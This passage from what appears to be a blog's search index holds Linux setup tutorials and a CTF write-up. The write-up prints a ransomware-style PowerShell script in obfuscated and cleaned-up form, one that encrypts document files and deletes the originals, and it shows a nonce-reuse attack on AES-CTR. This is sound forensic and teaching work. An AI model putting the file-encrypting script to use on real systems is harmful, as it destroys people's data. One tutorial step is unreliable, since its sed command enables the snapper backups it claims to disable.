volume token is set to the PARTUUID of my /boot partition (/dev/sda2).   loader and initrd paths are set using the specified volume as a root, so we don’t need to prefix those with /boot.   The cryptdevice kernel option must be set with the UUID of a block device of TYPE=\"crypto_LUKS\", which corresponds to my software RAID block device.   The UUID in the root kernel option should match the / entry in my fstab.   Since my root filesystem is mounted in a non-default Btrfs subvolume, I need to specify rootflags=subvol=@ as well.          Configuring the second-stage bootloader has always been the hardest part of installing Linux for me.        4. Reboot   If everything was set up correctly, we should be able to reboot into our freshly-installed system:      Leave the chroot environment by exiting the current shell   (Optionally) unmount partitions with umount -R /mnt   reboot   Choose the correct option in our boot loader of choice          rEFInd has already detected my existing Ubuntu install and has correctly set up a corresponding chain-load entry.        You’ll then be prompted for your disk encryption password before fully booting:     5. Post-installation   All done! I’ll leave any further post-installation steps to another post.  ","categories": ["tutorial"],
        "tags": ["linux"],
        "url": "/tutorial/arch-btrfs-luks-raid/",
        "teaser": "/assets/images/dual-boot/refind.png"
      },{
        "title": "How to set up lvmcache across LUKS-encrypted partitions",
        "excerpt":"In this tutorial, I’ll set up an lvmcache across LUKS-encrypted partitions in a Debian-based system. This was the solution I chose to increase the performance of hybrid storage - in which part of the SSD acts as a cache to the HDD - in a fully-encrypted setup.   Starting from a fresh Ubuntu 24.04 LTS encrypted install, we’ll:     Shrink the root volume in order to free disk space in the primary disk (SSD)   Create an encrypted partition in the secondary disk (HDD)   Configure a volume in the SSD as a cache for the HDD volume   Set up initramfs hooks to mount everything on boot, with a single decryption password   0. Prepare operating environment   While I’m sure some of the operations we’re about to perform could be applied to a live system, I prefer to do these things from a live USB. I’ll use an Arch Linux ISO for this, since it is lightweight and includes all the tools we need.   1. Reduce root SSD volume   After flashing the ISO to a USB and booting into it, we start by decrypting the Ubuntu LUKS partition (/dev/sda3 in this case). Then, we can resize the filesystem and reduce the logical volume in one go (in this case, freeing up 5GiB in the primary LVM physical volume):   $ cryptsetup open /dev/sda3 ubuntu-root $ lvreduce -v --resizefs -L -5G /dev/ubuntu-vg/ubuntu-lv          Shrinking the Ubuntu root logical volume.        2. Create an encrypted partition   Let’s set up the HDD LUKS-encrypted partition, making sure that:     We use the same encryption password as in the root volume (this is optional, but allows us to use the decrypt_keyctl script to unlock both partitions with a single password prompt)   The sector size used in the HDD partition matches the one in the SSD (this is mandatory as far as I’m aware, otherwise LVM won’t let us extend the volume group, issuing an error like Devices have inconsistent logical block sizes)          Setting up a new LUKS-encrypted partition with the right sector size, as verified with lsblk -t        3. Extend LVM volume group   Next, we layer an LVM physical volume on top of the new LUKS partition, then add it to the existing LVM volume group.   $ pvcreate /dev/mapper/ubuntu-data $ vgextend ubuntu-vg /dev/mapper/ubuntu-data          Extending an existing LVM volume group with a new physical volume.        NOTE: if you need to close a LUKS+LVM partition for any reason, you many need to stop the volume group with vgchange -a n ubuntu-vg before cryptsetup closeing the partition.   4. Set up the lvmcache   In order to create the cache, we’ll need a logical volume in each device:   $ lvcreate -n work-hdd -l 100%PVS ubuntu-vg /dev/mapper/ubuntu-data $ lvcreate -n work-ssd -l 100%PVS ubuntu-vg /dev/mapper/ubuntu-root          Creating a logical volume in each device.        Then, we follow the documentation in order to create the cache as either a --cachepool or a --cachevol (see this StackOverflow question for more information on the choice):   $ lvconvert --type cache --cachepool work-ssd ubuntu-vg/work-hdd          Converting volumes to an lvmcache. Notice that, like me, you may need to shrink the slower volume to accommodate LVM metadata.        In order to make use of the cache, just use the work-hdd logical volume normally. For example, this would be a good time to add a filesystem to the cached volume:   $ mkfs.ext4 /dev/ubuntu-vg/work-hdd   5. Reboot to Ubuntu   We should now be able to reboot into Ubuntu, albeit with a small hiccup: after entering our decryption password, the boot process may drop into a BusyBox recovery shell. There’s no need to panic, a first exit command will tip us that the reason for failure is that something went wrong when mounting the root volume.   In this case, that’s because we never told the system that it needed to decrypt the HDD partition, and LVM fails by default when a volume group is incomplete. We can run lvm lvdisplay to check that, while the new logical volume is not available, the old one (containing the system root) still is. Therefore, we just activate the volume group in partial mode with lvm vgchange -a y --partial ubuntu-vg, then exit again to finish the boot process.          Continuing a failed boot process with a partial LVM volume group.        6. Setting up decryption   Once the boot process is done, open a terminal to decrypt the remaining partition - the LVM volumes inside should also get recognized automatically.   $ sudo cryptsetup open /dev/sdb1 ubuntu-data   We’ll now set up a script which will cache our decryption password in order to open both of our LUKS partitions during the boot process (more specifically, by the initramfs image which is loaded from the boot partition).   We begin by installing the keyutils package. Then, edit the /etc/crypttab file in order to add the keyscript option and set up the same CRYPTTAB_KEY for both entries. We also add the initramfs options and make sure it will be handled there by setting CRYPTSETUP=y in /etc/cryptsetup-initramfs/conf-hook. Finally, re-generate the initramfs with update-initramfs.   $ sudo apt install keyutils $ sudo nano /etc/crypttab $ sudo nano /etc/cryptsetup-initramfs/conf-hook $ sudo update-initramfs -k all -u          Setting up the decrypt_keyctl script after some sanity checks.        After those steps, we can reboot to check that we’ll no longer drop to a BusyBox recovery shell. Furthermore, from now on, both partitions will be unlocked by a single boot password prompt.   7. Mount the cached partition   Finally, we can set up an entry in /etc/fstab in order to automatically mount our cached partition. In my case, I’ll create an /hdd folder that’s owned by my main user, but another possibility would be mounting to /home directly (make sure to have backups, if you do).   I should note that, in order to use UUIDs to reference an LVM logical volume in fstab, we need to combine the volume group (VG) UUID and the logical volume (LV) UUID. We can acquire those with vgdisplay and lvdisplay, respectively, then remove the hyphens and concatenate them to get the full LVM device mapper UUID path.          Setting up fstab to auto-mount the cached volume.        In the end, we have most of the system stored in the faster SSD, while our user data can stay in the bigger (but slower) HDD - both devices using LUKS encryption. The LVM subsystem will then take care of moving frequently accessed HDD data into the SSD cache - automatically improving performance for the data that’s actually being used. Victory!  ","categories": ["tutorial"],
        "tags": ["linux"],
        "url": "/tutorial/ubuntu-lvmcache/",
        "teaser": "/assets/images/dual-boot/os-ubuntu.png"
      },{
        "title": "How to set up an X-based desktop from scratch",
        "excerpt":"In the final post of this dual-boot series, I’ll show how to go from a base Arch install:          Base Arch tty, after booting for the first time - at least all peripherals (monitor, keyboard, mouse) were working out of the box.        To a simple awesomeWM desktop environment:          This is a screenshot of my personal install. We’ll be going in this direction.        0. Manual btrfs snapshot   Btrfs’s snapshot capability is one of the reasons I chose this file system, so before anything else I’ll use that to make a backup of the entire root partition. While I’ll create the snapshot manually this time, later in this tutorial I’m going to show how to set up automatic backups.   $ mount -o subvolid=5 /dev/mapper/arch-root /mnt $ btrfs subvolume snapshot /mnt/@ /mnt/@snapshot-baseline $ umount /mnt   That’s all it takes, and you’ll notice it’s also instant thanks to btrfs copy-on-write.          After creating the snapshot, we can also mount it and check its contents.        1. Network and time   During installation, I made sure that the NetworkManager systemd service would auto-start. In case you forgot to do that before, this is a good time to run:   $ systemctl enable NetworkManager $ systemctl start NetworkManager   I also like to always resolve localhost to … well … the local host. So I make sure that my /etc/hosts file contains the following entries:   127.0.0.1        localhost ::1              localhost   Since I also want my system time to be correct, I’ll also enable the built-in NTP service:   $ timedatectl set-ntp true     2. Firewall   The first thing to do after connecting to the internet is setting up protection - a firewall, in this case. I like ufw, which is pretty easy to install and enable by default:   $ pacman -S ufw $ systemctl enable ufw $ systemctl start ufw $ ufw enable $ ufw status verbose Status: active Logging: on (low) Default: deny (incoming), allow (outgoing), deny (routed) New profiles: skip   The default configuration is already the best option for most desktop users: deny all incoming traffic (connections initiated in the network) and allow all outgoing traffic.   Personally, I also like to use OpenSnitch to block all outgoing traffic by default, then handpick exceptions based on program, protocol and target address &amp; port. I know this is too much of a nuisance for most people, so I’ll leave this out of the tutorial.   3. Non-root user   Even if I’m the only person using this system, it’s more secure to do it from a non-root user by default. The following commands create a user called user with their own home directory, sets a password, then installs zsh and sets that as user’s default shell.   $ useradd --create-home user $ passwd user $ pacman -S zsh $ chsh -s /usr/bin/zsh user   Then, in order to be able to perform administrative actions through sudo or Polkit, I’ll add user to the wheel group:   $ usermod -aG wheel user   And also update the sudoers file with EDITOR=nano visudo, making sure to uncomment the line that reads:   %wheel ALL=(ALL:ALL) ALL          Using a non-privileged user by default is a security control, just like setting up a local firewall.        You can now exit the current shell and log back in as the new user. If you changed the default shell to zsh, you may also be prompted to do some initial configuration.   4. X initialization   We’re going to use X.Org as our window system, with awesome as a window manager. Furthermore, in order to access the shell from an X(11) session, we’ll also need to install a terminal emulator. We can get started by installing the necessary packages:   $ sudo pacman -S xorg-server xorg-xinit awesome alacritty   I want the Xorg server to start whenever I log in as user from the default tty1. Implementing this is as simple as configuring the zsh login shell (~/.zprofile) to run startx:   # /home/user/.zprofile if [ -z \"$DISPLAY\" ] &amp;&amp; [ \"$XDG_VTNR\" -le 1 ]; then     exec startx fi   The startx program will then run the ~/.xinitrc script to start up client programs, including our window manager of choice. We just need to copy the default script to the user’s home folder, remove the last few lines running programs we don’t have, and append exec awesome:   $ cp /etc/X11/xinit/xinitrc ~/.xinitrc $ nano ~/.xinitrc  $ cat ~/.xinitrc #!/bin/sh  # merge in defaults and keymaps  userresources=$HOME/.Xresources usermodmap=$HOME/.Xmodmap sysresources=/etc/X11/xinit/.Xresources sysmodmap=/etc/X11/xinit/.Xmodmap  if [ -f $sysresources ]; then     xrdb -merge $sysresources fi  if [ -f $sysmodmap ]; then     xmodmap $sysmodmap fi  if [ -f \"$userresources\" ]; then     xrdb -merge \"$userresources\" fi  if [ -f \"$usermodmap\" ]; then     xmodmap \"$usermodmap\" fi  # start some nice programs  if [ -d /etc/X11/xinit/xinitrc.d ] ; then  for f in /etc/X11/xinit/xinitrc.d/?*.sh ; do   [ -x \"$f\" ] &amp;&amp; . \"$f\"  done  unset f fi  exec awesome   Since I’m the only one who’ll be using this system, I’ll also enable auto-login - this means I’ll only have to type in the disk decryption password before getting to my desktop.   $ sudo mkdir -p /etc/systemd/system/getty@tty1.service.d $ sudo nano /etc/systemd/system/getty@tty1.service.d/autologin.conf  $ cat /etc/systemd/system/getty@tty1.service.d/autologin.conf [Service] Type=simple ExecStart= ExecStart=-/sbin/agetty -o '-p -f -- \\\\u' --noclear --autologin user %I $TERM Environment=XDG_SESSION_TYPE=x11   That’s it! We can now reboot and drop into a barebones graphical desktop:          A fresh install of awesomeWM. I have to say, getting to this point was easier than I thought it would be.        5. awesomeWM configuration   One of the first things you may notice if you’re following this tutorial is that the “open terminal” buttons and shortcuts are not working. That’s because, by default, awesome is configured to use xterm, whereas we installed Alacritty. You can still open Alacritty “manually”, either by typing alacritty in the command prompt (Super + R) or choosing it in the built-in application menu (Super + P).   After getting to a terminal, I suggest overriding the default configuration:   $ mkdir -p ~/.config/awesome/ $ cp /etc/xdg/awesome/rc.lua ~/.config/awesome/ $ nano ~/.config/awesome/rc.lua   Make sure to change the line that reads terminal = \"xterm\" to terminal = \"alacritty\". In order to apply any changes, we need to reload awesome (Super + Ctrl + R). We should now be able to open our terminal of choice with Super + Enter.   After that, I suggest taking a look at some awesomeWM configuration recipes in order to understand how to configure it, edit keybindings to your liking or add useful widgets. Note that, at this point, you can use pacman to install your web browser of choice and use that to read the documentation directly from your just-configured graphical system.   For example, one of the first things I did was adding a blurry screen lock script:   #!/bin/sh  set -e  screenshot=$(mktemp /tmp/lock-screen-scrot-XXXXXXXXXX) scrot --overwrite --format png -F \"$screenshot\" magick \"$screenshot\" -blur 0x8 \"${screenshot}-blur.png\" i3lock --image=\"${screenshot}-blur.png\" --pointer=default --ignore-empty-password \"$@\"   After saving this to a file called lock-screen, we need to:   $ sudo pacman -S i3lock scrot imagemagick               # install programs used in the script $ chmod +x lock-screen                                  # make the script executable $ mkdir -p ~/.local/bin                                 # create a ~/.local/bin/ folder $ echo 'export PATH=$PATH:$HOME/.local/bin' &gt;&gt; .zshenv  # append it to our user's PATH $ mv lock-screen ~/.local/bin/                          # put the lock screen script there   Then, in order to launch it with Super + L, add the following snippet to the global keys section of ~/.config/awesome/rc.lua. After restarting awesome, the new shortcut will also show up in the hotkeys help popup (Super + S), and will blur &amp; lock the screen when activated.   awful.key(     { modkey, }, \"l\",     function() awful.spawn(\"lock-screen\") end,     { description = \"lock the current session\", group = \"launcher\" } ),   Another thing you might want to do is load a prettier built-in theme (before overriding it to your own tastes) - you can list the contents of /usr/share/awesome/themes to check what alternatives came preinstalled with awesome. Then, you can change the beautiful.init() line in ~/.config/awesome/rc.lua, like so:   - beautiful.init(gears.filesystem.get_themes_dir() .. \"default/theme.lua\") + beautiful.init(gears.filesystem.get_themes_dir() .. \"xresources/theme.lua\")   6. Pipewire audio   A basic installation like the one we just went through mostly just works out of the box. I didn’t have to do anything other than plug in my HDMI monitor, wireless mouse and USB keyboard.   Soon enough, however, I realized that audio was missing. Desktop Linux is somewhat infamous for having audio issues, but I think PipeWire has made that a thing of the past. All we need to do is install a few packages (and possibly reboot), then it all just works:   $ sudo pacman -S pipewire \\     pipewire-audio pipewire-alsa pipewire-pulse pipewire-jack \\     wireplumber alsa-utils   You might want to set up keybindings for the following audio related commands:   $ alsamixer -V all                               # control audio in terminal $ pactl set-sink-volume @DEFAULT_SINK@ -5%       # lower volume by 5% $ pactl set-sink-volume @DEFAULT_SINK@ +5%       # increase volume by 5% $ pactl set-sink-mute @DEFAULT_SINK@ toggle      # toggle audio mute $ pactl set-source-mute @DEFAULT_SOURCE@ toggle  # toggle microphone mute   7. Pacman and snapshots   As promised, we’ll now set up automatic system backups, making use of btrfs snapshots. These are SYSTEM backups (of the root partition) and not DATA backups (does not include the home partition), intented to enable undoing a bad update or a breaking config change. You should configure additional backup schemes for user data.   With that disclaimer out of the way, let’s install snapper:   $ sudo pacman -S snapper $ sudo snapper -c root create-config /   Snapper saves snapshots under the /.snapshots mount point; that’s OK. The issue is that, by default, it creates a subvolume under whatever is currently mounted at /, but I would rather keep snapshots in the top-level of the btrfs volume structure. Therefore, I’ll delete the just-created .snapshots SUBVOLUME and make a new one, mounted at /.snapshots:   $ sudo btrfs subvolume delete /.snapshots $ sudo mount -o subvolid=5 /dev/mapper/arch-root /mnt $ sudo btrfs subvolume create /mnt/@snapshots $ sudo umount /mnt $ sudo mkdir /.snapshots $ sudo chmod 750 /.snapshots $ echo 'UUID=${same_UUID_as_other_subvolumes}\t/.snapshots\tbtrfs\tsubvol=@snapshots,rw,relatime,space_cache=v2,compress=zstd:1\t0\t0' | sudo tee -a /etc/fstab $ sudo mount /.snapshots   Then, I’ll disable snapper’s default time-based backups:   $ sudo sed -i 's/TIMELINE_CREATE=\"no\"/TIMELINE_CREATE=\"yes\"/' /etc/snapper/configs/root $ sudo systemctl stop snapper-timeline.timer $ sudo systemctl disable snapper-timeline.timer   In order to create a snapshot manually, we can run snapper create. To list existing snapshots, just use snapper list. Each snapshot is a btrfs subvolume and can be mounted as such.   Now, in order to run backups every time we make a potentially breaking change, we’ll install snap-pac. By default, it is configured to create a snapshot of the root partition before and after every time we modify the system with pacman (installing a package, updating the system, etc).   $ sudo pacman -S snap-pac   You can run snapper list to see the snapshot which was automatically created after installing snap-pac itself. Personally, I preferred to snapper delete this initial one, just to make sure every change has a pre and post snapshot.          Setting up snapper as an automatic system backup tool for Arch.        Although the current setup covers changes to the root partition, we might not be able to fully restore the system without kernel backups as well. The kernel is not currently being backed up, since it lives in the boot partition. Thankfully, the Arch Wiki has this covered by teaching us how to set up pacman hooks to copy the kernel from the boot partition to our snapshot-able root:   $ sudo pacman -S rsync $ sudo mkdir /.bootbackup $ sudo mkdir -p /etc/pacman.d/hooks  $ nano /etc/pacman.d/hooks/95-bootbackup_pre.hook $ cat /etc/pacman.d/hooks/95-bootbackup_pre.hook [Trigger] Operation = Upgrade Operation = Install Operation = Remove Type = Path Target = usr/lib/modules/*/vmlinuz [Action] Depends = rsync Description = Backing up pre /boot... When = PreTransaction Exec = /usr/bin/bash -c 'rsync -a --mkpath --delete /boot/ \"/.bootbackup/$(date +%Y-%m-%d.%Hh%Mm%Ss).pre\"/'  $ nano /etc/pacman.d/hooks/95-bootbackup_post.hook $ cat /etc/pacman.d/hooks/95-bootbackup_post.hook [Trigger] Operation = Upgrade Operation = Install Operation = Remove Type = Path Target = usr/lib/modules/*/vmlinuz [Action] Depends = rsync Description = Backing up post /boot... When = PostTransaction Exec = /usr/bin/bash -c 'rsync -a --mkpath --delete /boot/ \"/.bootbackup/$(date +%Y-%m-%d.%Hh%Mm%Ss).post\"/'   We can now run a full system update, with confidence that we can revert it in case things break. (In fact, it is a good idea to keep you Arch ISO live USB around, since restoring your system from these snapshots may require manual intervention).   $ sudo pacman -Syu   8. Other customizations   In the previous Arch tutorial, we went from a live USB to a minimal installation, with not much other than network connectivity. In this one, we moved from a TTY login to a graphical desktop environment, with auto-login, a terminal emulator, a working audio system, automatic backups and a fully customizable window manager; with a web browser being just a pacman -S away.   The result might still look and feel too barebones for some people, but after this point each one can customize the system however they like. That’s the beauty of (Arch) Linux: this system is now yours, do with it whatever you want. Enjoy!  ","categories": ["tutorial"],
        "tags": ["linux"],
        "url": "/tutorial/arch-awesomewm/",
        "teaser": "/assets/images/dual-boot/arch-rice.png"
      },{
        "title": "HTB Cyber Apocalypse CTF 2025",
        "excerpt":"I’m writing this just as this year’s HackTheBox Cyber Apocalypse CTF comes to an end.   I invited some friends and a few university freshmen to participate, and despite this being the first time in a cybersecurity CTF for most of the team, we ended up solving slightly more than a third (37%) of the challenges, capturing 29 out of 77 flags over a weekend. Our team didn’t make it to the podium (unsurprisingly), but we managed to place in the top 10% among all ~8k teams which signed up.     Personally, I think it was a good learning opportunity, and I’m looking forward to reading other people’s writeups on the challenges which we couldn’t solve. In the meantime, here is how I solved 3 particular challenges, each one in a different category and all with less than 1k solves:     Forensics - Cave Expedition   Crypto - Traces   Web - Cyber Attack   Forensics - Cave Expedition      Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process. Can you investigate about what happened and retrieve the map content?    File Identification   In this challenge, we’re only given a couple of files:  $ ls -a forensics_cave_expedition .  ..  Logs.zip  map.pdf.secured  $ file forensics_cave_expedition/* forensics_cave_expedition/Logs.zip:        Zip archive data, at least v2.0 to extract, compression method=deflate forensics_cave_expedition/map.pdf.secured: ASCII text, with very long lines (65536), with no line terminators   After a quick look at map.pdf.secured, we know it’s probably base64-encoded. Decoding it reveals a binary blob which file can’t identify, and using HexWalk reveals it has high entropy throughout. This really seems like an encrypted file, as stated in the challenge description.     Our small piece of lore also claims “it was possible to retrieve the original code that managed the encryption process”, so let’s look into the other file now.   Log Analysis   Within Logs.zip, we have 425 EVTX files, that is, Windows Event Logs. In Kali, we can apt install python3-evtx and then dump those into a more readable format with evtx_dump.py. Grabbing one of these log files at random, it looked like this:  &lt;?xml version=\"1.1\" encoding=\"utf-8\" standalone=\"yes\" ?&gt; &lt;Events&gt; &lt;/Events&gt;   So having most files empty, I sorted by size and started looking into the only one which stood out: Logs/Microsoft-Windows-Sysmon_Operational.evtx. After a quick look, we could see some interesting commands being executed, which you can see me grepping for below.    You can see some powershell lines printing pieces of base64 to a file, then decoding and executing it. We can reassemble the base64, and decode it into the following:  $k34Vm = \"Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm\" $m78Vo = \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo=\" $a53Va = \"NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==\" $b64Vb = \"n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ\"  $e90Vg = @{} $f12Vh = @{}  For ($x = 65; $x -le 90; $x++) {     $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) } }  function n90Vp {      [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo)) }  function l56Vn {     return (a12Vc $k34Vm).Split(\" \") }  For ($x = 97; $x -le 122; $x++) {     $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) } }  function a12Vc {     param([string]$a34Vd)     return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd)) }  $c56Ve = a12Vc $a53Va $d78Vf = a12Vc $b64Vb  For ($x = 48; $x -le 57; $x++) {     $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) } }  $e90Vg.GetEnumerator() | ForEach-Object {     $f12Vh[$_.Value] = $_.Key }  function l34Vn {     param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)     $p12Vr = [byte[]]::new($m56Vo.Length)     for ($x = 0; $x -lt $m56Vo.Length; $x++) {         $q34Vs = $n78Vp[$x % $n78Vp.Length]         $r56Vt = $o90Vq[$x % $o90Vq.Length]         $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt     }     return $p12Vr }  function s78Vu {     param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)      if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {         return $null     }      $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)     $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)     $a34Vc = l34Vn $t90Vv $y90Va $z12Vb      return [Convert]::ToBase64String($a34Vc) }  function o12Vq {     param([switch]$p34Vr)      try {         if ($p34Vr) {             foreach ($q56Vs in l56Vn) {                 $d34Vp = \"dca01aq2/\"                 if (Test-Path $d34Vp) {                     Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |                         Where-Object { $_.Extension -match \"^\\.$q56Vs$\" } |                         ForEach-Object {                             $r78Vt = $_.FullName                             if (Test-Path $r78Vt) {                                 $s90Vu = [IO.File]::ReadAllBytes($r78Vt)                                 $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf                                 [IO.File]::WriteAllText(\"$r78Vt.secured\", $t12Vv)                                 Remove-Item $r78Vt -Force                             }                         }                 }             }         }     }     catch {} }  if ($env:USERNAME -eq \"developer56546756\" -and $env:COMPUTERNAME -eq \"Workstation5678\") {     o12Vq -p34Vr     n90Vp }   Malware Deobfuscation   While this may look scary, the only dangerous pieces of this obfuscated powershell script are the calls to [IO.File]::WriteAllText and Remove-Item, within function o12Vq. Because of the conditional in the bottom, that’s only executed in a very specific environment. Furthermore, we can use a powershell interpreter to check out what some of these functions do, and what the base64 encoded strings translate to:      Here’s a more readable version of the important parts:   $extensions_encoded = \"Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm\" $key0_encoded = \"NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==\" $key1_encoded = \"n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ\"  function base64_decode {     param([string]$arg)     return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($arg)) }  $key0 = base64_decode $key0_encoded $key1 = base64_decode $key1_encoded  function extensions_list {     return (base64_decode $extensions_encoded).Split(\" \") }  function xor_encrypt {     param([byte[]]$input, [byte[]]$key0, [byte[]]$key1)     $result = [byte[]]::new($input.Length)     for ($x = 0; $x -lt $input.Length; $x++) {         $a = $key0[$x % $key0.Length]         $b = $key1[$x % $key1.Length]         $result[$x] = $input[$x] -bxor $a -bxor $b     }     return $result }  function do_encryption {     param([byte[]]$input, [string]$key0, [string]$key1)      if ($input -eq $null -or $input.Length -eq 0) {         return $null     }      $key0_bytes = [System.Text.Encoding]::UTF8.GetBytes($key0)     $key1_bytes = [System.Text.Encoding]::UTF8.GetBytes($key1)     $encrypted_bytes = xor_encrypt $input $key0_bytes $key1_bytes      return [Convert]::ToBase64String($encrypted_bytes) }  function do_ransomware {     param([switch]$do_it)     try {         if ($do_it) {             foreach ($ext in extensions_list) {                 $target_folder = \"dca01aq2/\"                 if (Test-Path $target_folder) {                     Get-ChildItem -Path $target_folder -Recurse -ErrorAction Stop |                         Where-Object { $_.Extension -match \"^\\.$ext$\" } |                         ForEach-Object {                             $file = $_.FullName                             if (Test-Path $file) {                                 $original_bytes = [IO.File]::ReadAllBytes($file)                                 $encrypted = do_encryption $original_bytes $key0 $key1                                 [IO.File]::WriteAllText(\"$file.secured\", $encrypted)                                 # Remove-Item $file -Force                             }                         }                 }             }         }     }     catch {} }  do_ransomware -do_it   And the TLDR is:     Grab all .txt, .doc, .docx and .pdf files inside folder dca01aq2/   XOR-encrypt each byte of those files with pieces of two keys   Base64-encode the result and write it to a file with an added .secured extension   Delete the original file   Decryption   Fortunately, we have the two encryption keys embedded in the script itself, and all it takes to reverse XOR encryption is to XOR the cyphertext back with the same key. We can even reuse the same powershell script for that purpose:  $ base64 -d map.pdf.secured &gt; map.pdf.decoded         # base64-decode the .secured file $ mkdir dca01aq2/                                     # make sure dca01aq2/ folder exists $ cp map.pdf.decoded dca01aq2/map.pdf                 # rename encrypted file with .pdf extension $ pwsh ./obfuscated.ps1                               # run the same script to reverse encryption + base64-encode $ base64 -d dca01aq2/map.pdf.secured &gt; decrypted.bin  # base64 decode to recover original file   We can verify that the decrypted file really is a PDF, then view it to get the flag:    Crypto - Traces      Long ago, a sacred message was sealed away, its meaning obscured by the overlapping echoes of its own magic. The careless work of an enchanter has left behind a flaw - a weakness hidden within repetition. With keen eyes and sharper wits, can you untangle the whispers of the past and restore the lost words?    In this challenge, we’re given an instance of a server running on a certain IP+port, and part of the Python code running on that server. You can find a verbatim copy of server.py here.   Server Interaction   We’re able to to connect to the server using netcat, and try out a few commands:    A few things we noticed:     We can see past messages, but they are encrypted   Even in encrypted messages, usernames and timestamps are stored in plain text   Among encrypted messages, we have repeated cypher texts   Local Reproduction   The source code can’t be executed out of the box since we’re missing a db module, but it’s easy enought to provide some local variables as a substitute. Furthermore, the code never saves new messages, and merely decrypts old ones when we join a chat room. That’s also easy to fix, and we can then start playing with it locally:    We can now confirm that equal messages are encrypted to the same cypher text. Looking back at the challenge description, it seems we can explore this “weakness hidden within repetition”.   Cryptoanalysis   Looking at the source, we see that encryption is done with:  encrypted_message = AES.new(self.key, AES.MODE_CTR, counter=Counter.new(128)).encrypt(msg)   And, knowing how AES-CTR works, we can assume that the same nonce is being reused when encrypting each message. We can validate that by grabbing one of the last few encrypted messages and XORing with the plain text !leave, assuming that’s what the previous users typed in chat. Then, we XOR that result with the beginning of every other message:   &gt;&gt;&gt; def xor(A, B): ...    return bytearray(a ^ b for a, b in zip(A, B)) &gt;&gt;&gt; &gt;&gt;&gt; msgs = [ ...    \"a9810fdc6aac809930ad4152c7d5\", ...    \"a9810fdc6aac978230b24a51c8dcd7\", ...    \"a9810fdc6aac968331a5455fc0d5da21\", ...    # ... ...    \"a98303de77e9\", ...    \"a98303de77e9\", ...    \"a98303de77e9\", &gt;&gt;&gt; ] &gt;&gt;&gt; &gt;&gt;&gt; C = bytes.fromhex(msgs[-1]) &gt;&gt;&gt; M = b\"!leave\" &gt;&gt;&gt; X = xor(M, C) &gt;&gt;&gt; &gt;&gt;&gt; for i, msg in enumerate(msgs): ...    print(f\"decrypt[{i}]:\", xor(X, bytes.fromhex(msg)))   And we get:   decrypt[0]: bytearray(b'!nick ') decrypt[1]: bytearray(b'!nick ') decrypt[2]: bytearray(b'!nick ') decrypt[3]: bytearray(b\"We\\'ve \") decrypt[4]: bytearray(b'Unders') decrypt[5]: bytearray(b'Not ye') decrypt[6]: bytearray(b'This c') decrypt[7]: bytearray(b'Here i') decrypt[8]: bytearray(b'Got it') decrypt[9]: bytearray(b'Yes. O') decrypt[10]: bytearray(b\"I\\'m ch\") decrypt[11]: bytearray(b'Keep m') decrypt[12]: bytearray(b\"I\\'ll c\") decrypt[13]: bytearray(b'If eve') decrypt[14]: bytearray(b'Hold o') decrypt[15]: bytearray(b'We can') decrypt[16]: bytearray(b'Agreed') decrypt[17]: bytearray(b'Unders') decrypt[18]: bytearray(b'!leave') decrypt[19]: bytearray(b'!leave') decrypt[20]: bytearray(b'!leave')   Yes! Now, even without having the original encryption key (like we had in the previous challenge), we can decrypt the first few characters of all messages.   Known-Plaintext Attack   In order to decrypt the rest, we have to repeat the following process:     Look at what we have decrypted so far   Guess what the 